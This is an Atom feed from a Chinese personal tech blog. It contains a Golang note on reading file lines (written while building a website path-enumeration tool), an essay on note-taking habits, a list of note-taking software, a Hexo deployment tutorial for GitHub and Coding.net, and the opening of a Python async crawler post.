<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Akkuman Blog</title>
  <subtitle>Python &amp; Hacker</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://hacktech.cn/"/>
  <updated>2017-03-03T14:13:58.822Z</updated>
  <id>http://hacktech.cn/</id>
  
  <author>
    <name>Akkuman</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Golang踩坑录 两种方式来读取文件一行所导致的问题</title>
    <link href="http://hacktech.cn/2017/02/04/Golang%E8%B8%A9%E5%9D%91%E5%BD%95-%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%9D%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E4%B8%80%E8%A1%8C%E6%89%80%E5%AF%BC%E8%87%B4%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>http://hacktech.cn/2017/02/04/Golang踩坑录-两种方式来读取文件一行所导致的问题/</id>
    <published>2017-02-04T14:55:15.000Z</published>
    <updated>2017-03-03T14:13:58.822Z</updated>
    
    <content type="html"><![CDATA[<p>前两天零零碎碎看完了golang的基础，想着找个小项目练练手，可是出现了一个十分棘手的问题<br>我要做的东西是网站路径爆破<br>所以我会从文本字典中把一行行路径读取然后与域名拼接，但是我在跑起程序后出现了问题</p>
<a id="more"></a>
<p>下面是一个小片段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">400 Bad Request-----http://www.xxx.com/channel.asp</div><div class="line">400 Bad Request-----http://www.xxx.com/index.asp</div><div class="line">404 Not Found-----http://www.xxx.com/admin.asp</div></pre></td></tr></table></figure></p>
<p>程序本身并没有错误，但是运行结果就比较怪了<br>Bad Request?<br>这并不是我要说的重点，我发现的问题是，除了最后一个地址，前面所有的地址都会显示位400 Bad Request<br>经过几轮测试，我觉得应该是网址拼接上出了问题</p>
<p>我的拼接函数是这样<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReturnBurstURL</span><span class="params">(fURL *os.File, baseurl <span class="keyword">string</span>)</span> <span class="params">(urlList []<span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	allURLTxt := bufio.NewReader(fURL)</div><div class="line">	<span class="keyword">for</span> &#123;</div><div class="line">		urlpath, readerError := allURLTxt.ReadString(<span class="string">'\n'</span>)</div><div class="line">		newurl := baseurl + strings.Replace(urlpath, <span class="string">"\n"</span>, <span class="string">""</span>, <span class="number">-1</span>)</div><div class="line">		urlList = <span class="built_in">append</span>(urlList, newurl)</div><div class="line">		<span class="keyword">if</span> readerError == io.EOF &#123;</div><div class="line">			fmt.Printf(<span class="string">"\n读取字典完成，准备开始，请等待...\n"</span>)</div><div class="line">			<span class="keyword">return</span> urlList</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>我把取一行的方式换成bufio.NewScanner就正常了<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReturnBurstURL</span><span class="params">(fURL *os.File, baseurl <span class="keyword">string</span>)</span> <span class="params">(urlList []<span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	allURLTxt := bufio.NewScanner(fURL)</div><div class="line">	<span class="keyword">for</span> allURLTxt.Scan() &#123;</div><div class="line">		newurl := baseurl + allURLTxt.Text()</div><div class="line">		urlList = <span class="built_in">append</span>(urlList, newurl)</div><div class="line">	&#125;</div><div class="line">	fmt.Printf(<span class="string">"\n读取字典完成，准备开始，请等待...\n"</span>)</div><div class="line">	<span class="keyword">return</span> urlList</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>网上读取文件一行很多人写的文章是第一种方法，但是我也不知道什么问题导致这种情况的发生<br>我特地去查了查api文档<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewReader</span><span class="params">(rd io.Reader)</span> *<span class="title">Reader</span></span></div><div class="line">//<span class="title">NewReader</span> <span class="title">returns</span> <span class="title">a</span> <span class="title">new</span> <span class="title">Reader</span> <span class="title">whose</span> <span class="title">buffer</span> <span class="title">has</span> <span class="title">the</span> <span class="title">default</span> <span class="title">size</span>. </div><div class="line"><span class="title">func</span> <span class="params">(b *Reader)</span> <span class="title">ReadString</span><span class="params">(delim <span class="keyword">byte</span>)</span> <span class="params">(<span class="keyword">string</span>, error)</span></div><div class="line">//<span class="title">ReadString</span> <span class="title">reads</span> <span class="title">until</span> <span class="title">the</span> <span class="title">first</span> <span class="title">occurrence</span> <span class="title">of</span> <span class="title">delim</span> <span class="title">in</span> <span class="title">the</span> <span class="title">input</span>, <span class="title">returning</span> <span class="title">a</span> <span class="title">string</span> <span class="title">containing</span> <span class="title">the</span> <span class="title">data</span> <span class="title">up</span> <span class="title">to</span> <span class="title">and</span> <span class="title">including</span> <span class="title">the</span> <span class="title">delimiter</span>. <span class="title">If</span> <span class="title">ReadString</span> <span class="title">encounters</span> <span class="title">an</span> <span class="title">error</span> <span class="title">before</span> <span class="title">finding</span> <span class="title">a</span> <span class="title">delimiter</span>, <span class="title">it</span> <span class="title">returns</span> <span class="title">the</span> <span class="title">data</span> <span class="title">read</span> <span class="title">before</span> <span class="title">the</span> <span class="title">error</span> <span class="title">and</span> <span class="title">the</span> <span class="title">error</span> <span class="title">itself</span> <span class="params">(often io.EOF)</span>. <span class="title">ReadString</span> <span class="title">returns</span> <span class="title">err</span> != <span class="title">nil</span> <span class="title">if</span> <span class="title">and</span> <span class="title">only</span> <span class="title">if</span> <span class="title">the</span> <span class="title">returned</span> <span class="title">data</span> <span class="title">does</span> <span class="title">not</span> <span class="title">end</span> <span class="title">in</span> <span class="title">delim</span>. <span class="title">For</span> <span class="title">simple</span> <span class="title">uses</span>, <span class="title">a</span> <span class="title">Scanner</span> <span class="title">may</span> <span class="title">be</span> <span class="title">more</span> <span class="title">convenient</span>. </div><div class="line"><span class="title">func</span> <span class="title">NewScanner</span><span class="params">(r io.Reader)</span> *<span class="title">Scanner</span></div><div class="line">//<span class="title">NewScanner</span> <span class="title">returns</span> <span class="title">a</span> <span class="title">new</span> <span class="title">Scanner</span> <span class="title">to</span> <span class="title">read</span> <span class="title">from</span> <span class="title">r</span>. <span class="title">The</span> <span class="title">split</span> <span class="title">function</span> <span class="title">defaults</span> <span class="title">to</span> <span class="title">ScanLines</span>. </div><div class="line"><span class="title">func</span> <span class="params">(s *Scanner)</span> <span class="title">Scan</span><span class="params">()</span> <span class="title">bool</span></div><div class="line">//<span class="title">Scan</span> <span class="title">advances</span> <span class="title">the</span> <span class="title">Scanner</span> <span class="title">to</span> <span class="title">the</span> <span class="title">next</span> <span class="title">token</span>, <span class="title">which</span> <span class="title">will</span> <span class="title">then</span> <span class="title">be</span> <span class="title">available</span> <span class="title">through</span> <span class="title">the</span> <span class="title">Bytes</span> <span class="title">or</span> <span class="title">Text</span> <span class="title">method</span>. <span class="title">It</span> <span class="title">returns</span> <span class="title">false</span> <span class="title">when</span> <span class="title">the</span> <span class="title">scan</span> <span class="title">stops</span>, <span class="title">either</span> <span class="title">by</span> <span class="title">reaching</span> <span class="title">the</span> <span class="title">end</span> <span class="title">of</span> <span class="title">the</span> <span class="title">input</span> <span class="title">or</span> <span class="title">an</span> <span class="title">error</span>. <span class="title">After</span> <span class="title">Scan</span> <span class="title">returns</span> <span class="title">false</span>, <span class="title">the</span> <span class="title">Err</span> <span class="title">method</span> <span class="title">will</span> <span class="title">return</span> <span class="title">any</span> <span class="title">error</span> <span class="title">that</span> <span class="title">occurred</span> <span class="title">during</span> <span class="title">scanning</span>, <span class="title">except</span> <span class="title">that</span> <span class="title">if</span> <span class="title">it</span> <span class="title">was</span> <span class="title">io</span>.<span class="title">EOF</span>, <span class="title">Err</span> <span class="title">will</span> <span class="title">return</span> <span class="title">nil</span>. <span class="title">Scan</span> <span class="title">panics</span> <span class="title">if</span> <span class="title">the</span> <span class="title">split</span> <span class="title">function</span> <span class="title">returns</span> 100 <span class="title">empty</span> <span class="title">tokens</span> <span class="title">without</span> <span class="title">advancing</span> <span class="title">the</span> <span class="title">input</span>. <span class="title">This</span> <span class="title">is</span> <span class="title">a</span> <span class="title">common</span> <span class="title">error</span> <span class="title">mode</span> <span class="title">for</span> <span class="title">scanners</span>. </div><div class="line"><span class="title">func</span> <span class="params">(s *Scanner)</span> <span class="title">Text</span><span class="params">()</span> <span class="title">string</span></div><div class="line">//<span class="title">Text</span> <span class="title">returns</span> <span class="title">the</span> <span class="title">most</span> <span class="title">recent</span> <span class="title">token</span> <span class="title">generated</span> <span class="title">by</span> <span class="title">a</span> <span class="title">call</span> <span class="title">to</span> <span class="title">Scan</span> <span class="title">as</span> <span class="title">a</span> <span class="title">newly</span> <span class="title">allocated</span> <span class="title">string</span> <span class="title">holding</span> <span class="title">its</span> <span class="title">bytes</span>.</div></pre></td></tr></table></figure></p>
<p>按照上面的api文档，这两个的区别就是两者在返回string的时候，一个是数据+分隔符，一个是一行的数据，不带分隔符<br>虽说我第一种方法也用strings.Replace方法把”\n”替换成了””空字符，但是可能还是有点奇奇怪怪的东西</p>
<p><em>转载请注明出处</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前两天零零碎碎看完了golang的基础，想着找个小项目练练手，可是出现了一个十分棘手的问题&lt;br&gt;我要做的东西是网站路径爆破&lt;br&gt;所以我会从文本字典中把一行行路径读取然后与域名拼接，但是我在跑起程序后出现了问题&lt;/p&gt;
    
    </summary>
    
      <category term="Golang" scheme="http://hacktech.cn/categories/Golang/"/>
    
    
      <category term="Golang" scheme="http://hacktech.cn/tags/Golang/"/>
    
      <category term="问题解决" scheme="http://hacktech.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
  </entry>
  
  <entry>
    <title>笔记带给我们是真实的知识增长么？你需要好好考虑了</title>
    <link href="http://hacktech.cn/2017/01/21/%E7%AC%94%E8%AE%B0%E5%B8%A6%E7%BB%99%E6%88%91%E4%BB%AC%E6%98%AF%E7%9C%9F%E5%AE%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E5%A2%9E%E9%95%BF%E4%B9%88%EF%BC%9F%E4%BD%A0%E9%9C%80%E8%A6%81%E5%A5%BD%E5%A5%BD%E8%80%83%E8%99%91%E4%BA%86/"/>
    <id>http://hacktech.cn/2017/01/21/笔记带给我们是真实的知识增长么？你需要好好考虑了/</id>
    <published>2017-01-21T08:54:38.000Z</published>
    <updated>2017-03-03T14:28:19.685Z</updated>
    
    <content type="html"><![CDATA[<p>我有段时间疯狂使用各类笔记软件，相信什么云记忆，第二大脑之类的说法。后来发现，没啥意义。记多了根本看不完，你在当时没时间看的，过后更没时间看。笔记唯一剩下的作用就是检索，但是你没看过的内容，你又怎么知道要检索啥呢？而且，自己维护的资料库，怎么也没办法跟google的检索比。善用google的搜索规则，比浪费时间剪藏保存一大堆网页有效得多。<br><a id="more"></a><br>其实滥用或者过分依赖这些笔记软件，最大的坏处是产生了知识增长的错觉。剪藏一篇机器学习的长文，就以为自己的知识增长了，其实只扫了一眼前言。 下载了一系列新框架的开发教程，三分钟热度把开发环境搭建完，跟着第一章跑了个hello world就弃坑了，但还是在欺骗自己，觉得自己已经掌握了，最不济那些教程已经被我收到硬盘里了，要用的时候再翻出来学嘛。而且，这种廉价的获得知识的错觉，带来的成就感比真的花时间去学习还要强，甚至会形成“要开工了-&gt;先了解下业界动态，去各大论坛微博逛一圈-&gt;哇，又有这么多新教程/技巧/开源库，看不过来，先保存到笔记软件 -&gt; 啊，不知不觉居然花了一个小时，不过我又不是打游戏看电影，是在收集知识，对自己还是有帮助的，不算虚度时光吧 -&gt; 继续开工，嗯？这个问题好像看到过更好的解决办法，要不要试着优化下？算了算了，反正办法在笔记里存着，以后有时间再重构吧 -&gt;…”</p>
<p>那几个月里我一直就陷在这样的循环里，同时还沾沾自喜于自己的“努力”而不自觉。直到某天，有个面试者坐到我面前时，我惊讶于他面谈时对各类业界动态新框架新技术口若悬河，但是实际的笔试题目却做得惨不忍睹，有些基础概念题都直接留白。我试探性地问了下原因，结果他特别诚恳地看着我说，这些问题的答案都存在他包里的笔记本电脑里，只要他想，分分钟就能搜出来。</p>
<p>当时我下意识地反问了一句：“那谁不会啊？”</p>
<p>说完我自己都惊了一下。</p>
<p>那天之后，我很少再去碰那些笔记软件了。第二大脑什么的都是骗人的，在我得老年痴呆之前，应该不会特别依赖它们。曾经我一个月要从各大技术论坛微博twitter上收集几十篇教程，上百篇技术长文，真正看完的，不到五篇。之后我发现，把产生这些知识的源头掐掉，统统加到127.0.0.1里去，节省下的时间认认真真读几本经典纸质书，跟着官方文档走一遍教程，不收集，多动手多思考，技术长进比之前快得多。实际做项目的时候碰到解决不了的问题怎么办？直接开google去搜呗。根本没必要去浪费时间维护一个私人的知识库。</p>
<p>在人类数千年漫长的文明史中，收藏本来是一件相当奢侈，大量耗费金钱、时间、精力的事情。但到了互联网的时代，这一切被简化成了点点鼠标就能完成的美事。或许因为盗版盛行的原因，它几乎已经是免费的，但它对于个体时间精力的耗费，却始终没有变化。而且，躺在硬盘里的资源们，就像王阳明的花一样，你未看它时，它与你同归于寂，一点关系都没有。</p>
<p>《银河英雄传说》里杨威利说过一句名言：“如果你不记得了，那说明它不重要。” 或许可以再补充一句，“如果你看不完，那就没必要看完。” 大概就是这样，不知不觉写了这么多，与所有现在或曾经的互联网资源收集成瘾症患者共勉。</p>
<p>转自<a href="https://www.v2ex.com/amp/t/191507" target="_blank" rel="external">V2EX</a>一位v友的回答</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我有段时间疯狂使用各类笔记软件，相信什么云记忆，第二大脑之类的说法。后来发现，没啥意义。记多了根本看不完，你在当时没时间看的，过后更没时间看。笔记唯一剩下的作用就是检索，但是你没看过的内容，你又怎么知道要检索啥呢？而且，自己维护的资料库，怎么也没办法跟google的检索比。善用google的搜索规则，比浪费时间剪藏保存一大堆网页有效得多。&lt;br&gt;
    
    </summary>
    
      <category term="生活" scheme="http://hacktech.cn/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="life" scheme="http://hacktech.cn/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>PKM（个人知识管理）类软件收集(偶尔更新列表)</title>
    <link href="http://hacktech.cn/2017/01/21/PKM%EF%BC%88%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%EF%BC%89%E7%B1%BB%E8%BD%AF%E4%BB%B6-%E5%81%B6%E5%B0%94%E6%9B%B4%E6%96%B0%E5%88%97%E8%A1%A8/"/>
    <id>http://hacktech.cn/2017/01/21/PKM（个人知识管理）类软件-偶尔更新列表/</id>
    <published>2017-01-21T06:22:41.000Z</published>
    <updated>2017-03-03T14:29:58.910Z</updated>
    
    <content type="html"><![CDATA[<p>evernote(印象笔记)</p>
<p>Wiz<br><a id="more"></a><br>有道云</p>
<p>麦库</p>
<p>leanote</p>
<p>GoogleKeep</p>
<p>OneNote</p>
<p>SimpleNote(wp家的，免费)</p>
<p>pocket(稍后读的软件，同类的还有Instapaper，国内的收趣)</p>
<p>MyBase</p>
<p>RaysNote(v友开发)</p>
<p>CintaNotes</p>
<p><a href="https://jitaku.io" target="_blank" rel="external">https://jitaku.io</a></p>
<p><em>开源</em></p>
<p>Gitit-Bigger</p>
<p>Laverna</p>
<p>paperwork</p>
<p>DokuWiki</p>
<p>leanote</p>
<p>PermaNote</p>
<p>CherryTree</p>
<p>BrainStorm</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;evernote(印象笔记)&lt;/p&gt;
&lt;p&gt;Wiz&lt;br&gt;
    
    </summary>
    
      <category term="推荐向" scheme="http://hacktech.cn/categories/%E6%8E%A8%E8%8D%90%E5%90%91/"/>
    
    
      <category term="推荐向" scheme="http://hacktech.cn/tags/%E6%8E%A8%E8%8D%90%E5%90%91/"/>
    
      <category term="软件" scheme="http://hacktech.cn/tags/%E8%BD%AF%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>hexo在github和coding.net部署并分流（一）</title>
    <link href="http://hacktech.cn/2017/01/10/hexo%E5%9C%A8github%E5%92%8Ccoding-net%E9%83%A8%E7%BD%B2%E5%B9%B6%E5%88%86%E6%B5%81%EF%BC%88%E4%B8%80%EF%BC%89-1/"/>
    <id>http://hacktech.cn/2017/01/10/hexo在github和coding-net部署并分流（一）-1/</id>
    <published>2017-01-10T13:22:00.000Z</published>
    <updated>2017-01-10T13:23:11.558Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装GIT和Node-JS"><a href="#安装GIT和Node-JS" class="headerlink" title="安装GIT和Node.JS"></a>安装GIT和Node.JS</h1><p>首先在自己的电脑上安装好git和node.js，这一步怎么做自己搜索，安装软件都是下一步下一步，应该不难,GIT安装完成后打开git cmd输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git config --global user.name <span class="string">"Your Name"</span></div><div class="line">git config --global user.email <span class="string">"email@example.com"</span></div></pre></td></tr></table></figure></p>
<p>因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。<br><strong>注意：</strong>git config命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。</p>
<a id="more"></a>
<p>#安装并初始化HEXO<br>如果你是在Windows上，请打开Git-CMD<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/git-cmd-exa.png" alt="1"><br>假如你是想在D:\blog\下建立你的博客，请先在D盘下新建文件夹blog<br>在Git-CMD中输入<code>npm install -g hexo-cli</code>回车开始安装hexo<br>安装完成后将git cmd工作目录切换至D:\blog\然后输入<code>hexo init</code>回车，或者直接在git cmd中输入<code>hexo init d:\\blog</code><br>如果你的d:\blog\下的目录形式是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.</div><div class="line">├── _config.yml // 网站的配置信息，你可以在此配置大部分的参数。</div><div class="line">├── package.json </div><div class="line">├── scaffolds // 模板文件夹。当你新建文章时，Hexo会根据scaffold来建立文件。</div><div class="line">├── source // 存放用户资源的地方</div><div class="line">|   ├── _drafts</div><div class="line">|   └── _posts</div><div class="line">└── themes // 存放网站的主题。Hexo会根据主题来生成静态页面。</div></pre></td></tr></table></figure></p>
<p>那么你的hexo安装并初始化完成<br>然后输入<code>hexo server</code>启动本地demo，打开浏览器，查看<a href="http://localhost:4000/可以看到自己的博客" target="_blank" rel="external">http://localhost:4000/可以看到自己的博客</a></p>
<h1 id="将之托管到github和coding上"><a href="#将之托管到github和coding上" class="headerlink" title="将之托管到github和coding上"></a>将之托管到github和coding上</h1><h2 id="github项目创建"><a href="#github项目创建" class="headerlink" title="github项目创建"></a>github项目创建</h2><p>1.注册github账号<br>2.创建项目仓库<br>进入<a href="https://github.com/" target="_blank" rel="external">github.com</a>，然后点击右上角 + –&gt;new repository</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/new%20rep.png" alt="2"></p>
<p>3.在Repository name中填写Github账号名.github.io，点击Create repository，完成创建。</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/hexo-github-1.png" alt="3"></p>
<h2 id="Coding项目创建"><a href="#Coding项目创建" class="headerlink" title="Coding项目创建"></a>Coding项目创建</h2><p>1.注册Coding账号<br>2.创建项目仓库</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/hexo-coding-1.png" alt="4"></p>
<p>3.填写项目名称描述创建即可</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/hexo-coding-2.png" alt="5"></p>
<h2 id="配置SHH"><a href="#配置SHH" class="headerlink" title="配置SHH"></a>配置SHH</h2><p>配置shh key是让本地git项目与远程的github建立联系<br>1.检查是否已经有SSH Key，打开Git Bash，输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> ~/.ssh</div></pre></td></tr></table></figure></p>
<p>2.如果没有.ssh这个目录，则生成一个新的SSH，输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa -C <span class="string">"your e-mail"</span></div></pre></td></tr></table></figure></p>
<p>注意1: 此处的邮箱地址，你可以输入自己的邮箱地址；注意2: 此处的「-C」的是大写的「C」<br>接下来几步都直接按回车键,然后系统会要你输入密码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):&lt;输入加密串&gt;</div><div class="line">Enter same passphrase again:&lt;再次输入加密串&gt;</div></pre></td></tr></table></figure></p>
<p>这个密码会在你提交项目时使用，如果为空的话提交项目时则不用输入。这个设置是防止别人往你的项目里提交内容。个人建议为空比较方便<br>注意：输入密码的时候没有*字样的，你直接输入就可以了。<br>3.最后看到这样的界面，就成功设置ssh key了<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/wangzhanssh%20key.jpg" alt="6"></p>
<h2 id="添加-SSH-Key-到-GitHub和Coding"><a href="#添加-SSH-Key-到-GitHub和Coding" class="headerlink" title="添加 SSH Key 到 GitHub和Coding"></a>添加 SSH Key 到 GitHub和Coding</h2><p>复制<code>~/.ssh/id_rsa.pub</code>中的内容<br>~是个人文件夹，比如我的电脑上是C:\Users\Administrator.ssh\id_rsa.pub，将其中的文本复制<br>进入github，点击头像–&gt;Setting–&gt;SSH and GPG keys,然后在右侧点击New SSH key，<br>Title随便写，key中填写id_rsa.pub中复制的内容，然后Add SSH key就ok了<br>进入Coding.net，点击头像–&gt;个人设置–&gt;SSH公钥，新增公钥，公钥名称随便，公钥内容是填写id_rsa.pub中复制的内容，有效期可以勾选永久，然后添加ok</p>
<h2 id="测试SSH是否配置成功"><a href="#测试SSH是否配置成功" class="headerlink" title="测试SSH是否配置成功"></a>测试SSH是否配置成功</h2><p>1.打开Git Bash，然后输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -T git@github.com</div></pre></td></tr></table></figure></p>
<p>如配置了密码则要输入密码,输完按回车<br>如果显示以下内容，则说明Github中的ssh配置成功。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Hi username! You<span class="string">'ve successfully authenticated, but GitHub does not</span></div><div class="line">provide shell access.</div></pre></td></tr></table></figure></p>
<p>2.再输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -T git@git.coding.net</div></pre></td></tr></table></figure></p>
<p>如果显示以下则说明coding中的ssh配置成功<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Hello username You<span class="string">'ve connected to Coding.net by SSH successfully!</span></div></pre></td></tr></table></figure></p>
<h2 id="创建Github-Pages和Coding-Pages-服务"><a href="#创建Github-Pages和Coding-Pages-服务" class="headerlink" title="创建Github Pages和Coding Pages 服务"></a>创建Github Pages和Coding Pages 服务</h2><p>1.GitHub Pages分两种，一种是你的GitHub用户名建立的username.github.io这样的用户&amp;组织页（站），另一种是依附项目的pages。想建立个人博客是用的第一种，形如cnfeat.github.io这样的可访问的站，每个用户名下面只能建立一个。<br>Coding Pages服务开启在官网说的很详细，不知道请百度<br>2.打开D:\blog文件夹中的_config.yml文件，找到如下位置，填写<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Deployment</span></div><div class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></div><div class="line">deploy:</div><div class="line">- <span class="built_in">type</span>: git</div><div class="line">  repo: </div><div class="line">    github: git@github.com:yourname/yourname.github.io.git,master</div><div class="line">    coding: git@git.coding.net:yourname/yourname.git,coding-pages</div></pre></td></tr></table></figure></p>
<p><strong>注：</strong> (1) 其中yourname替换成你的Github账户名;(2)注意在yml文件中，:后面都是要带空格的。</p>
<p>#部署完成<br>在blog文件夹中空白处右击打开Git Bash输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">hexo clean</div><div class="line">hexo d- g</div></pre></td></tr></table></figure></p>
<p>此时，通过访问<a href="http://yourname.github.io和http://yourname.coding.me可以看到默认的Hexo首页面（与之前本地测试时一样）。" target="_blank" rel="external">http://yourname.github.io和http://yourname.coding.me可以看到默认的Hexo首页面（与之前本地测试时一样）。</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;安装GIT和Node-JS&quot;&gt;&lt;a href=&quot;#安装GIT和Node-JS&quot; class=&quot;headerlink&quot; title=&quot;安装GIT和Node.JS&quot;&gt;&lt;/a&gt;安装GIT和Node.JS&lt;/h1&gt;&lt;p&gt;首先在自己的电脑上安装好git和node.js，这一步怎么做自己搜索，安装软件都是下一步下一步，应该不难,GIT安装完成后打开git cmd输入&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;git config --global user.name &lt;span class=&quot;string&quot;&gt;&quot;Your Name&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;git config --global user.email &lt;span class=&quot;string&quot;&gt;&quot;email@example.com&quot;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。&lt;br&gt;&lt;strong&gt;注意：&lt;/strong&gt;git config命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Hexo" scheme="http://hacktech.cn/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Python异步爬虫的学习(一)</title>
    <link href="http://hacktech.cn/2016/12/11/Python%E5%BC%82%E6%AD%A5%E7%88%AC%E8%99%AB%E7%9A%84%E5%AD%A6%E4%B9%A0(%E4%B8%80)/"/>
    <id>http://hacktech.cn/2016/12/11/Python异步爬虫的学习(一)/</id>
    <published>2016-12-11T08:26:49.000Z</published>
    <updated>2016-12-11T09:18:49.000Z</updated>
    
    <content type="html"><![CDATA[<hr>
<p>本文主要从一下几个方面进行说明:</p>
<ul>
<li>什么是<a href="http://baike.baidu.com/item/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B" target="_blank" rel="external">异步(Asynchronous)编程</a></li>
<li>为什么要使用异步编程？</li>
<li>如何利用Python实现异步</li>
</ul>
<hr>
<a id="more"></a>
<h1 id="什么是异步编程"><a href="#什么是异步编程" class="headerlink" title="什么是异步编程"></a>什么是异步编程</h1><h2 id="文章开始前，先简单介绍下各种-IO-模型："><a href="#文章开始前，先简单介绍下各种-IO-模型：" class="headerlink" title="文章开始前，先简单介绍下各种 IO 模型："></a>文章开始前，先简单介绍下各种 IO 模型：</h2><h3 id="最容易做的是阻塞-IO"><a href="#最容易做的是阻塞-IO" class="headerlink" title="最容易做的是阻塞 IO"></a>最容易做的是阻塞 IO</h3><p>即读写数据时，需要等待操作完成，才能继续执行。进阶的做法就是用多线程来处理需要 IO 的部分，缺点是开销会有些大。</p>
<h3 id="接着是非阻塞-IO"><a href="#接着是非阻塞-IO" class="headerlink" title="接着是非阻塞 IO"></a>接着是非阻塞 IO</h3><p>即读写数据时，如果暂时不可读写，则立刻返回，而不等待。因为不知道什么时候是可读写的，所以轮询时可能会浪费 CPU 时间。</p>
